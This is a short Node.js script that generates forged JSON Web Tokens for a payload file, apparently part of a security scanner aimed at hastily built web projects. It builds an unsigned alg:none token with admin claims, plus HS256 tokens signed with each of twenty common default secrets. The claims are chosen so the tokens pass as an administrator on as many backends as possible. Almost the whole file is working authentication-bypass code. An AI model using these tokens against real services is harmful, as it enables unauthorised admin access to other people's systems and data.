#!/usr/bin/env node
/**
 * Generate the JWTs baked into payloads/auth.json:
 *
 *   1. one alg:none token with admin-ish claims
 *   2. one HS256 token per common dev secret (the weak-jwt-secret-guessable
 *      payload tries each against probable user-info endpoints)
 *
 * This is intentionally a one-shot script, not a runtime path. Tokens get
 * pasted into the payload file once so payloads/auth.json is self-contained
 * and the loader doesn't need crypto at runtime.
 *
 * Output: JSON to stdout.
 *
 * Run with:  node scripts/gen-jwts.mjs > /tmp/jwts.json
 */
import { createHmac } from "node:crypto";

const b64url = (input) =>
  Buffer.from(input)
    .toString("base64")
    .replace(/=+$/, "")
    .replace(/\+/g, "-")
    .replace(/\//g, "_");

// Claims chosen to satisfy as many backends as possible: standard JWT 'sub',
// numeric `id`/`user_id`/`userId`, and admin flags under several common
// field names. iat in the recent past, exp far in the future.
const CLAIMS = {
  sub: "1",
  id: 1,
  user_id: 1,
  userId: 1,
  email: "admin@example.com",
  role: "admin",
  isAdmin: true,
  iat: 1700000000,
  exp: 9999999999,
};

// Common dev/test/default JWT signing secrets. Ranked roughly by frequency
// of appearance in vibe-coded projects.
const SECRETS = [
  "secret",
  "your-secret",
  "your-secret-key",
  "your-256-bit-secret",
  "changeme",
  "supersecret",
  "jwt-secret",
  "JWT_SECRET",
  "dev",
  "test",
  "default",
  "password",
  "admin",
  "my-secret",
  "my-jwt-secret",
  "secretkey",
  "mysecret",
  "change-me",
  "token-secret",
  "123456",
];

const noneHeader = b64url(JSON.stringify({ alg: "none", typ: "JWT" }));
const hsHeader = b64url(JSON.stringify({ alg: "HS256", typ: "JWT" }));
const payload = b64url(JSON.stringify(CLAIMS));

const algNoneToken = `${noneHeader}.${payload}.`;

const hsTokens = {};
for (const secret of SECRETS) {
  const signing_input = `${hsHeader}.${payload}`;
  const sig = b64url(createHmac("sha256", secret).update(signing_input).digest());
  hsTokens[secret] = `${signing_input}.${sig}`;
}

const out = {
  claims: CLAIMS,
  alg_none_token: algNoneToken,
  hs256_tokens: hsTokens,
};
console.log(JSON.stringify(out, null, 2));
